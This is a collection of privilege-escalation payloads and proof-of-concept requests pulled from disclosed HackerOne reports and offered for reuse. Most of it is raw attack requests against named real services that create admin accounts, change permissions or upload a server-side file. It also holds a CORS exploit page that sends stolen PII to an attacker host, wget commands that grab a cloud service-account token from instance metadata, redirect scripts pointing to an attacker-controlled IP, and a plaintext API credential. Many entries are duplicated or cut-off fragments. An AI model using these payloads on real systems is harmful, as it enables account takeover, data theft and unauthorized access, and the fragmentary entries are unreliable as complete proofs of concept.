# Privilege Escalation  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#412481](https://hackerone.com/reports/412481)  -  China - ecjobsdc.starbucks.com.cn html/shtml file upload vulnerability
*high*

```http
POST /recruitjob/hxpublic_v6/hxinterface6.aspx?_hxcategory=hx_filebox_upload_file HTTP/1.1
Host: ecjobsdc.starbucks.com.cn
Content-Length: 234
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryevPInYidBxSvSd06

------WebKitFormBoundaryevPInYidBxSvSd06
Content-Disposition: form-data; name="hxwebfileboxcontrol_upload_file_inputbox"; filename="xxx.shtml"
Content-Type: text/html

<?php echo 1111;>
------WebKitFormBoundaryevPInYidBxSvSd06--
```

## 2. [#3025797](https://hackerone.com/reports/3025797)  -  [Privilege Escalation] User can Pin|Unpin Any Comment on Any Project or Locale
*low*

```http
POST /pin-comment/ HTTP/1.1
Host: mozilla-pontoon-staging.herokuapp.com
Cookie: ████████
Referer: https://mozilla-pontoon-staging.herokuapp.com/eu/amo-frontend/LC_MESSAGES/amo.po/?string=175106
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 16
Origin: https://mozilla-pontoon-staging.herokuapp.com

comment_id=25725
```

## 3. [#3025797](https://hackerone.com/reports/3025797)  -  [Privilege Escalation] User can Pin|Unpin Any Comment on Any Project or Locale
*low*

```http
POST /unpin-comment/ HTTP/1.1
Host: mozilla-pontoon-staging.herokuapp.com
Cookie: ███
Referer: https://mozilla-pontoon-staging.herokuapp.com/eu/amo-frontend/LC_MESSAGES/amo.po/?string=175106
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 16
Origin: https://mozilla-pontoon-staging.herokuapp.com

comment_id=25725
```

## 4. [#412481](https://hackerone.com/reports/412481)  -  China - ecjobsdc.starbucks.com.cn html/shtml file upload vulnerability
*high*

```http
POST /recruitjob/hxpublic_v6/hxinterface6.aspx?_hxcategory=hx_filebox_upload_file HTTP/1.1
Host: ecjobsdc.starbucks.com.cn
Content-Length: 234
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryevPInYidBxSvSd06

------WebKitFormBoundaryevPInYidBxSvSd06
```

## 5. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```http
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Length: 100
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Referer: https://app.bountypay.h1ctf.com/

username=brian.oliver&password=V7h0inzX&challenge=70fc6bcd3409b8acaec02992d31b4d03&challenge_answer=xxxxxxxx
```

## 6. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```http
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Length: 100
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Referer: https://app.bountypay.h1ctf.com/

username=brian.oliver&password=V7h0inzX&challenge=5828c689761cce705a1c84d9b1a1ed5e&challenge_answer=bD83Jk27dQ
```

## 7. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```http
POST /?template=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
Content-Length: 42
Origin: https://staff.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Referer: https://staff.bountypay.h1ctf.com/?template=home
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbF…

profile_name=sandra&profile_avatar=upgradeToAdmin
```

## 8. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```http
POST /?template=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
Content-Length: 54
Origin: https://staff.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Referer: https://staff.bountypay.h1ctf.com/?template=home
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NV…

profile_name=sandra&profile_avatar=tab1 upgradeToAdmin
```

## 9. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```http
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Length: 123
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Referer: https://app.bountypay.h1ctf.com/

username=marten.mickos&password=h%26H5wy2Lggj*kKn4OD%26Ype&challenge=098f6bcd4621d373cade4e832627b4f6&challenge_answer=test
```

## 10. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```http
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Length: 73
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

## 11. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```http
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Length: 100
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
```

## 12. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```http
POST /?template=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
Content-Length: 42
Origin: https://staff.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
```

## 13. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```http
POST /?template=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
Content-Length: 54
Origin: https://staff.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
```

## 14. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```http
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Length: 123
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
```

## 15. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```http
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Length: 73
Origin: https://app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
```

## 16. [#1245736](https://hackerone.com/reports/1245736)  -  A non-privileged user may create an admin account in Stocky
*medium*

```http
POST /users/create_admin HTTP/2
Host: stocky.shopifyapps.com
Cookie:[REPLACE COOKIES]
Content-Length: 277
Origin: https://stocky.shopifyapps.com
Content-Type: application/x-www-form-urlencoded
Referer: https://stocky.shopifyapps.com/preferences/users

utf8=%E2%9C%93&authenticity_token=[REPLACE TOKEN]&user%5Bfirst_name%5D=██████&user%5Blast_name%5D=████████&user%5Bemail%5D=██████████&commit=Create+%26+Login
```

## 17. [#1245736](https://hackerone.com/reports/1245736)  -  A non-privileged user may create an admin account in Stocky
*medium*

```http
POST /users/create_admin HTTP/2
Host: stocky.shopifyapps.com
Cookie:[REPLACE COOKIES]
Content-Length: 277
Origin: https://stocky.shopifyapps.com
Content-Type: application/x-www-form-urlencoded
```

## 18. [#3020021](https://hackerone.com/reports/3020021)  -  [Vertical Privilege Escalation] User can Unapproved any Approved Translation at [/translations/unapprove/]
*medium*

```http
POST /translations/unapprove/ HTTP/1.1
Host: mozilla-pontoon-staging.herokuapp.com
Cookie: ███
Referer: https://mozilla-pontoon-staging.herokuapp.com/nl/amo-frontend/LC_MESSAGES/amo.po/?string=175106
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 52
Origin: https://mozilla-pontoon-staging.herokuapp.com

translation=5184479&paths%5B%5D=LC_MESSAGES%2Famo.po
```

## 19. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```http
GET /statements?month=03&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
X-Requested-With: XMLHttpRequest
Referer: https://app.bountypay.h1ctf.com/
Cookie: token=eyJhY2NvdW50X2lkIjoidGVzdCIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9
```

## 20. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```http
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
Referer: https://api.bountypay.h1ctf.com/
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

staff_id=STF:8FJ3KFISL3
```

## 21. [#689314](https://hackerone.com/reports/689314)  -  Project Template functionality can be used to copy private project data, such as repository, confidential issues, snippets, and merge requests
*critical, $12,000*

```http
POST /projects HTTP/1.1
Host: instance

----------506740453
Content-Disposition: form-data; name="project[use_custom_template]"

false
----------506740453
Content-Disposition: form-data; name="project[template_name]"

----------506740453
Content-Disposition: form-data; name="project[group_with_project_templates_id]"

----------506740453
Content-Disposition: form-data; name="project[name]"

project_name
----------506740453
Content-Disposition: form-data; name="project[namespace_id]"

1
----------506740453
Content-Disposition: form-data; name="project[path]"

project_name
----------506740453--
```

## 22. [#894949](https://hackerone.com/reports/894949)  -  [H1-2006 2020] Exploiting multiple vulnerabilities to get hacker's payment ensured
*critical*

```
#Attack on Android:

##Part 1:

I downloaded the apk file by visiting `https://software.bountypay.h1ctf.com/uploads/BountyPay.apk`
When I ran the app on my Android, It offered no interesting content, I tried to capture traffic but nothing was going on, So I decided to dig deeper.

I decompiled it using apktool, and read java code using Jd-GUI.

After a close look at the app source code and the `AndroidManifest.xml`, I noticed three main activities, each of them are invoked through a particular scheme (one,two and three respectively), and all of which had a common host=part. 

After a user is registred to the app with her/his username and twitter handle, the MainActivity will create a user_created file and store this information in user shared preferences directory.

The code responsible for the validation of the first part is as below:
```

## 23. [#894949](https://hackerone.com/reports/894949)  -  [H1-2006 2020] Exploiting multiple vulnerabilities to get hacker's payment ensured
*critical*

```
After hitting this link, I could see an input text that expects a new value in order to validate this part (the provided value is the MD5 hash of “token” string). The `submitInfo` method has a listener on `childRef` instance which points to “header” value. On the same method, there is a public method named `onDataChange` which compares str1 and str2 strings and validate this part by writing “PARTTWO:COMPLETE” in created_user file. After entering “X-Token” value into the text field and hitting submit, Part 2 was validated.

##Part 3:
I noticed in `PartThreeActivity` that an intent is waiting for a base64 encoded values for three and switch parameters to be `UGFydFRocmVlQWN0aXZpdHk=` and `b24=` respectively. To validate this part, I needed to invoke `submitHash` method which will then invoke `correctHash` method that will trigger the `CongratsActivity`. The `submitHash` is waiting for the value of header which is no other than the value of “TOKEN” in created_user.xml file.
```

## 24. [#3020021](https://hackerone.com/reports/3020021)  -  [Vertical Privilege Escalation] User can Unapproved any Approved Translation at [/translations/unapprove/]
*medium*

```http
POST /translations/unapprove/ HTTP/1.1
Host: mozilla-pontoon-staging.herokuapp.com
Cookie: ███
Referer: https://mozilla-pontoon-staging.herokuapp.com/nl/amo-frontend/LC_MESSAGES/amo.po/?string=175106
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 52
```

## 25. [#852613](https://hackerone.com/reports/852613)  -  Remote Code Execution on Cloud via latest Kibana 7.6.2
*critical, $10,000*

```http
PUT /.kibana_1/_doc/upgrade-assistant-telemetry:upgrade-assistant-telemetry
```

## 26. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```http
GET /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
Referer: https://api.bountypay.h1ctf.com/
```

## 27. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```http
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
Referer: https://api.bountypay.h1ctf.com/
Content-Type: application/x-www-form-urlencoded
```

## 28. [#3025797](https://hackerone.com/reports/3025797)  -  [Privilege Escalation] User can Pin|Unpin Any Comment on Any Project or Locale
*low*

```http
POST /pin-comment/ HTTP/1.1
Host: mozilla-pontoon-staging.herokuapp.com
Cookie: ████████
Referer: https://mozilla-pontoon-staging.herokuapp.com/eu/amo-frontend/LC_MESSAGES/amo.po/?string=175106
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 16
```

## 29. [#3025797](https://hackerone.com/reports/3025797)  -  [Privilege Escalation] User can Pin|Unpin Any Comment on Any Project or Locale
*low*

```http
POST /unpin-comment/ HTTP/1.1
Host: mozilla-pontoon-staging.herokuapp.com
Cookie: ███
Referer: https://mozilla-pontoon-staging.herokuapp.com/eu/amo-frontend/LC_MESSAGES/amo.po/?string=175106
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 16
```

## 30. [#1572591](https://hackerone.com/reports/1572591)  -  Privilege Escalation - "Analyst" Role Can View Email Domains of a Company - [GET /voyager/api/voyagerOrganizationDashEmailDomainMappings]
*medium*

```http
GET /voyager/api/voyagerOrganizationDashEmailDomainMappings?decorationId=com.linkedin.voyager.dash.deco.organization.FullOrganizationEmailDomainMapping-2&company=urn%3Ali%3Afsd_company%3A81541206&count=100&q=organization&start=0 HTTP/2
Host: www.linkedin.com
Referer: https://www.linkedin.com/company/81541206/admin/manage-admins/
Cookie: REDACTED
```

## 31. [#1572591](https://hackerone.com/reports/1572591)  -  Privilege Escalation - "Analyst" Role Can View Email Domains of a Company - [GET /voyager/api/voyagerOrganizationDashEmailDomainMappings]
*medium*

```http
GET /voyager/api/voyagerOrganizationDashEmailDomainMappings?decorationId=com.linkedin.voyager.dash.deco.organization.FullOrganizationEmailDomainMapping-2&company=urn%3Ali%3Afsd_company%3A81541206&count=100&q=organization&start=0 HTTP/2
Host: www.linkedin.com
Referer: https://www.linkedin.com/company/81541206/admin/manage-admins/
```

## 32. [#2450685](https://hackerone.com/reports/2450685)  -  Unauthorized access to PII leads to Administrator account Takeover
*critical*

```html
<!DOCTYPE html>
<html>
<body>
<center>
<h3>Steal administrator PII data!</h3>
<html>
<body>
<button type='button' onclick='cors()'>Exploit</button>
<p id='demo'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from niche.co about user account
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://burpcollaborator-intruder-evil.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("GET", "https://www.mtn.com/wp-json/wp/v2/users/15", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```

## 33. [#894949](https://hackerone.com/reports/894949)  -  [H1-2006 2020] Exploiting multiple vulnerabilities to get hacker's payment ensured
*critical*

```
After doing some brute force on the code name, I figured out that we have seven input in the form of `“code_X”` with X within [1-7].

#The final exploit:
I use the following python script to generate a css file that contains all possible alphanumeric strings combined with each code position and send them to the server, if a value exists for a particular code, the server will request our vps with `position/code_x_value`, then we parse our logs to get the whole code value . After getting the correct code,a POST request is sent through our proxy and a wonderful congratulation is printed back with the final ==FLAG=^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$==
```

## 34. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```
$(".upgradeToAdmin").click(function() {
    let t = $('input[name="username"]').val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin")
    })
}), $(".tab").click(function() {
    return $(".tab").removeClass("active"), $(this).addClass("active"), $("div.content").addClass("hidden"), $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1
}), $(".sendReport").click(function() {
    $.get("/admin/report?url=" + url, function() {
        alert("Report sent to admin team")
    }), $("#myModal").modal("hide")
}), document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));
```

## 35. [#905543](https://hackerone.com/reports/905543)  -  Low Privileged user can add or remove cash to/from sales register
*low*

```http
POST /admin/api/unversioned/graphql HTTP/1.1
Host: alwayzhack.myshopify.com
Content-Type: application/json
Content-Length: 667

{"query":"fragment UserErrors on UserError { __typename field message } mutation CashTrackingSessionAdjust($sessionID: ID!, $money: MoneyInput!, $time: DateTime!, $staffMemberId: ID!, $note: String) { __typename cashTrackingSessionAdjust(cashTrackingSessionId: $sessionID, cash: $money, time: $time, staffMemberId: $staffMemberId, note: $note) { __typename userErrors { __typename ... UserErrors } cashTrackingSession { __typename id } } }","variables":{"money":{"amount":"500","currencyCode":"INR"},"sessionID":"gid:\/\/shopify\/CashTrackingSession\/58327096","note":"","time":"2020-06-22T17:19:21+05:30","staffMemberId":"gid:\/\/shopify\/StaffMember\/42668326968"}}
```

## 36. [#1842829](https://hackerone.com/reports/1842829)  -  Privilege Escalation in kOps using GCE/GCP Provider
*high, $2,500*

```
pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -O default.token
  pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script -O- | grep ConfigBase
```

## 37. [#1842829](https://hackerone.com/reports/1842829)  -  Privilege Escalation in kOps using GCE/GCP Provider
*high, $2,500*

```
pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -O admin.token
```

## 38. [#689314](https://hackerone.com/reports/689314)  -  Project Template functionality can be used to copy private project data, such as repository, confidential issues, snippets, and merge requests
*critical, $12,000*

```http
POST /projects HTTP/1.1
Host: instance
```

## 39. [#861744](https://hackerone.com/reports/861744)  -  Remote Code Execution in coming Kibana 7.7.0
*critical, $5,000*

```http
PUT /.ml-anomalies-custom-linux_anomalous_network_activity_ecs/_doc/my-anomaly?refresh
```

## 40. [#895172](https://hackerone.com/reports/895172)  -  [H1-2006 2020] Bypassing access control checks by modifying the URL, internal application state, or the HTML page, or using a custom API attack tool
*critical*

```http
GET /admin/report?url=Lz90ZW1wbGF0ZT1ob21l 

Again we see a base64 crash that contains /?Template=home
```

## 41. [#343626](https://hackerone.com/reports/343626)  -  Privilege escalation allows any user to add an administrator
*critical*

```http
POST /admin/user/insert HTTP/1.1
Host: localhost:1111
Referer: http://localhost:1111/admin/setup
Content-Type: application/x-www-form-urlencoded
Cookie: connect.sid=[NORMAL_USER_COOKIE]

usersName=NEWADMIN&userEmail=new@admin.com&userPassword=password&frm_userPassword_confirm=password
```

## 42. [#894949](https://hackerone.com/reports/894949)  -  [H1-2006 2020] Exploiting multiple vulnerabilities to get hacker's payment ensured
*critical*

```
Now, let’s get serious.

#Give to Marten what belongs to Marten:

##Infiltrating the staff:
After the Android surrendered the TOKEN, I used it to communicate with the REST api. That is how I discovered the “api/staff” endpoint which gave me info on two staff members: Sam and Brian. 
I changed GET to POST method to see when it could get me, but it returned  ["Missing Parameter"], which indicated that I needed another parameter to create a new staff member. The GET method gives me the name of the missing parameter: `name` and `staff_id`. 
But even then, I couldn’t create any valid account since it was looking for a valid `staff_id` parameter. Then a hint from the CTF creators came to the rescue. Sandra Allison which is a newly recruited staff was very happy to join BountyPay company and her tweet offered us valuable information. Her badge was showing her staff id which was the missing piece of the puzzle.

Using her credentials, I was able to login to `https://staff.bountypay.h1ctf.com`
{F861470}
##Privilege escalation:

After playing around with the staff application I figured I had the following options: updating the profile and avatar, contacting admin through support section but comments were disabled and reporting any page to the admin which will be visited by the admin (except if the page started with /admin). I have tried many attacks at this stage:
×	sending blind XSS payloads when reporting from all pages
×	modifying avatar name to xss payloads (but good filters were implemented) 
×	changing my name to “admin” 
×	trying to report a page that will update my account’s rights to admin but without starting with admin endpoint `https://staff.bountypay.h1ctf.com/admin/report?url=Ly4uL0FETUlOL3VwZ3JhZGU/dXNlcm5hbWU9c2FuZHJh`  (/../ADMIN/upgrade?username=sandra). 

All of this was useless, so I had to change my approach. 

Back to the staff application, I found an interesting javascript file located at: `https://staff.bountypay.h1ctf.com/js/website.js`.
A deep analysis of this file showed me that visiting `URL/#tab4` will load the hash location of that page and trigger any existing function on that page `($(".tab4").trigger("click")))`. 
Since I wanted to trigger the `upgradeToAdmin` function, I needed a place to insert `tab4` and `upgradeToAdmin` so when I visited this page the function be triggered. Avatar name seemed like a good place to inject that payload since it will be reflected inside avatar class:
# … truncated …
```

## 43. [#895172](https://hackerone.com/reports/895172)  -  [H1-2006 2020] Bypassing access control checks by modifying the URL, internal application state, or the HTML page, or using a custom API attack tool
*critical*

```
../../redirect?url=https://software.bountypay.h1ctf.com/#
```

## 44. [#894949](https://hackerone.com/reports/894949)  -  [H1-2006 2020] Exploiting multiple vulnerabilities to get hacker's payment ensured
*critical*

```
../../redirect?url=https://software.bountypay.h1ctf.com/?
```

## 45. [#894949](https://hackerone.com/reports/894949)  -  [H1-2006 2020] Exploiting multiple vulnerabilities to get hacker's payment ensured
*critical*

```
../../redirect?url=https://software.bountypay.h1ctf.com/%s?
```

## 46. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```
../../../redirect?url=https://software.bountypay.h1ctf.com/#/
```

## 47. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```
../../../redirect?url=https://software.bountypay.h1ctf.com/`
```

## 48. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```
../../../redirect?url=https://software.bountypay.h1ctf.com/uploads/#/
```

## 49. [#1350095](https://hackerone.com/reports/1350095)  -  Staff  can use BULK_OPERATIONS_FINISH webhook topic using Graphql without permissions all
*medium*

```http
POST /admin/internal/web/graphql/core?operation=PageStaff HTTP/1.1
Host: yinvi-nacho-2.myshopify.com

{
```

## 50. [#1084892](https://hackerone.com/reports/1084892)  -  [h1-2102] [Plus] User with Store Management Permission can Make changeDomainEnforcementState - that should be limited to User Management Only
*medium*

```http
POST /34946971/stores/api HTTP/1.1
Host: shopify.plus

{"query":"query{organization{domains{id}}}"}
```

## 51. [#1084892](https://hackerone.com/reports/1084892)  -  [h1-2102] [Plus] User with Store Management Permission can Make changeDomainEnforcementState - that should be limited to User Management Only
*medium*

```http
POST /34946971/stores/api HTTP/1.1
Host: shopify.plus

{"query":"mutation  {\n  changeDomainEnforcementState(domainIds: [\"REPLACE_ME\"],enforcementState:NOT_ENFORCED) {\n    organization {\n      id\n      domains {\n        id\n        domainName\n        status\n        verified\n        __typename\n      }\n      __typename\n    }\n    userErrors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

## 52. [#1084892](https://hackerone.com/reports/1084892)  -  [h1-2102] [Plus] User with Store Management Permission can Make changeDomainEnforcementState - that should be limited to User Management Only
*medium*

```http
POST /34946971/stores/api HTTP/1.1
Host: shopify.plus
```

## 53. [#1084904](https://hackerone.com/reports/1084904)  -  [h1-2102] [Plus] User with Store Management Permission can Make convertUsersFromSaml/convertUsersToSaml - that should be limited to User Management
*medium*

```http
POST /34946971/users/api HTTP/1.1
Host: shopify.plus

{"operationName":"GetAllUserIds","variables":{},"query":"query GetAllUserIds {\n  organization {\n    id\n    users {\n      edges {\n        node {\n          id\n   email       __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

## 54. [#1084904](https://hackerone.com/reports/1084904)  -  [h1-2102] [Plus] User with Store Management Permission can Make convertUsersFromSaml/convertUsersToSaml - that should be limited to User Management
*medium*

```http
POST /34946971/stores/api HTTP/1.1
Host: shopify.plus

{"query":"mutation{convertUsersFromSaml(organizationUserIds:[\"REPLACE_ME\"]){userErrors{message}}}"}
```

## 55. [#1084904](https://hackerone.com/reports/1084904)  -  [h1-2102] [Plus] User with Store Management Permission can Make convertUsersFromSaml/convertUsersToSaml - that should be limited to User Management
*medium*

```http
POST /34946971/stores/api HTTP/1.1
Host: shopify.plus

{"query":"mutation{convertUsersToSaml(userIds:[\"REPLACE_ME\"]){userErrors{message}}}"}
```

## 56. [#1084904](https://hackerone.com/reports/1084904)  -  [h1-2102] [Plus] User with Store Management Permission can Make convertUsersFromSaml/convertUsersToSaml - that should be limited to User Management
*medium*

```http
POST /34946971/users/api HTTP/1.1
Host: shopify.plus
```

## 57. [#837018](https://hackerone.com/reports/837018)  -  Privilege Escalation in BuddyPress core allows Moderate to Administrator
*medium*

```http
POST /wp-json/buddypress/v1/groups/[group_A_id]/members/[id_user] HTTP/1.1
```

## 58. [#892337](https://hackerone.com/reports/892337)  -  [H1-2006 2020] [CTF Writeup] A story about Bounty Payments, Collaboration & Community
*critical*

```json
{"account_id":"F8gHiqSdpK/../../../redirect?url=https://software.bountypay.h1ctf.com/uploads/#/","hash":"de235bffd23df6995ad4e0930baac1a2"}
```

## 59. [#852613](https://hackerone.com/reports/852613)  -  Remote Code Execution on Cloud via latest Kibana 7.6.2
*critical, $10,000*

```http
PUT /.kibana_1/_mappings
```

## 60. [#779113](https://hackerone.com/reports/779113)  -  [h1-415 2020] @_bayotop h1-415-ctf writeup
*critical*

```html
<script>window.location='http://ip-under-my-control'+window.location</script>
```

## 61. [#779113](https://hackerone.com/reports/779113)  -  [h1-415 2020] @_bayotop h1-415-ctf writeup
*critical*

```html
<script>window.location='http://<ip-under-my-control>'</script>
```

## 62. [#3025797](https://hackerone.com/reports/3025797)  -  [Privilege Escalation] User can Pin|Unpin Any Comment on Any Project or Locale
*low*

```javascript
{canPin ? (
            comment.pinned ? (
              // Unpin Button
              <Localized
                id='comments-Comment--unpin-button'
                attrs={{ title: true }}
              >
                <button
                  className='pin-button'
                  title='Unpin comment'
                  onClick={handlePinAndUnpin}
                >
                  {'UNPIN'}
                </button>
              </Localized>
            ) : (
              // Pin Button
              <Localized
                id='comments-Comment--pin-button'
                attrs={{ title: true }}
              >
                <button
                  className='pin-button'
                  title='Pin comment'
                  onClick={handlePinAndUnpin}
                >
                  {'PIN'}
                </button>
              </Localized>
            )
          ) : null}
```

## 63. [#2081930](https://hackerone.com/reports/2081930)  -  Bypass report submit restriction/ban using the API key
*medium*

```bash
curl "https://api.hackerone.com/v1/hackers/reports"   -X POST   -u "testhackerone-creative:pYnONekvxUTvHbKF7Jp64qh9STIhhdXvKmefWOeR8YU="   -H 'Content-Type: application/json'   -H 'Accept: application/json'   -d @- <<EOD
{
  "data": {
    "type": "report",
    "attributes": {
      "team_handle": "HackerOne-test_h1b",
      "title": "string",
      "vulnerability_information": "test tst tst",
      "impact": "tst tst",
      "severity_rating": "none",
      "weakness_id": 1
    }
  }
}
EOD
```

## 64. [#1193062](https://hackerone.com/reports/1193062)  -  Privilege escalation of "external user" (with maintainer privilege) to internal access  through project token
*medium*

```bash
curl --header "Authorization: Bearer <TOKEN>" "https://gitlab.domain.com/api/v4/projects"
```

## 65. [#1193062](https://hackerone.com/reports/1193062)  -  Privilege escalation of "external user" (with maintainer privilege) to internal access  through project token
*medium*

```bash
curl -X POST --header "Authorization: Bearer <TOKEN>" "https://gitlab.domain.com/api/v4/groups?name=newg&path=newgroup"
```

## 66. [#1193062](https://hackerone.com/reports/1193062)  -  Privilege escalation of "external user" (with maintainer privilege) to internal access  through project token
*medium*

```bash
curl -X POST --header "Authorization: Bearer <TOKEN>" "https://gitlab.domain.com/api/v4/projects/21/issues?title=iWasHere"
```

## 67. [#1193062](https://hackerone.com/reports/1193062)  -  Privilege escalation of "external user" (with maintainer privilege) to internal access  through project token
*medium*

```bash
curl --header "Authorization: Bearer <TOKEN>" "https://gitlab.domain.com/api/v4/projects/19/repository/blobs/83d9398518bdf1519b7b8fbbb3fa3e305a8554ef/raw"
```

## 68. [#619484](https://hackerone.com/reports/619484)  -  User with read-only access to a share can gain write access to sub-folders in the share
*medium*

```bash
curl --user user1:user1 "http://172.17.0.1:8081/ocs/v1.php/apps/files_sharing/api/v1/shares/3" -H "OCS-APIRequest: true"  -X PUT --data 'permissions=15'
```

## 69. [#779113](https://hackerone.com/reports/779113)  -  [h1-415 2020] @_bayotop h1-415-ctf writeup
*critical*

```html
<script src='https://raw.githack.com/mattboldt/typed.js/master/lib%252f..%252f..%252f..%252f..%252fbayotop/playground/master/g2.js'></script>
```

